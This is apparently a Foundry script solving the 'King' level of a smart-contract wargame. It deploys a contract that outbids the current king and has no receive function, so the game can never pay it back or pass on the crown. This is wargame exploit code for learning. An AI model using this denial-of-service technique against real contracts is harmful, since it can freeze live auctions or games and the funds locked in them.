// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level09King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ImKing {
    constructor (King _kingInstance) payable {
        console.log("ImKing contract balance: ", address(this).balance);

        (bool success, ) = address(_kingInstance).call{value: address(this).balance}("");
        require(success, "KingInstance call failed");
    }
}

contract Level09KingSolution is Script{
    King kingInstance = King(payable(0x2346768D3faa0b868b1d4867A132299407C12849));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        uint prize = kingInstance.prize();

        console.log("Before prize: ", prize);
        console.log("Before King: ", kingInstance._king());

        new ImKing{value: prize+1}(kingInstance);

        console.log("After King: ", kingInstance._king());
        console.log("After prize: ", kingInstance.prize());

        vm.stopBroadcast();
    }
}